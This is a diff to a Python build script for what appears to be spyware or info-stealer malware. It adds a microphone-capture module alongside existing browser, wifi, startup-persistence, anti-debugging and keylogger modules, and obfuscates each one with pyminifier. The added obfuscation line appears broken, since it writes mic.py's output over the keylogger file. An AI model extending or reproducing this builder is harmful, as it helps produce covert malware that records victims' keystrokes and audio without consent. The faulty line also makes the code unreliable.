@@ -26,7 +26,7 @@ def check_token(token):
 def create_env(dir):
     progress.start()
     task = progress.add_task("Creating env...", total=1)
-    files = ["main.py", "modules/browser.py", "modules/antidebug.py", "modules/info.py", "modules/wifi.py", "modules/startup.py", "modules/keylogger.py"]
+    files = ["main.py", "modules/browser.py", "modules/antidebug.py", "modules/info.py", "modules/wifi.py", "modules/startup.py", "modules/keylogger.py", "modules/mic.py"]
     path = os.path.join(os.getcwd(), dir)
     
     if not os.path.exists(path):
@@ -59,6 +59,7 @@ def obfuscate():
         subprocess.run(f"pyminifier -o build/modules/antidebug.py build/modules/antidebug.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/antidebug.py
         subprocess.run(f"pyminifier -o build/modules/wifi.py build/modules/wifi.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/wifi.py
         subprocess.run(f"pyminifier -o build/modules/keylogger.py build/modules/keylogger.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/keylogger.py
+        subprocess.run(f"pyminifier -o build/modules/keylogger.py build/modules/mic.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/mic.py
         progress.update(task1, advance=1)
     except:
         progress.stop()
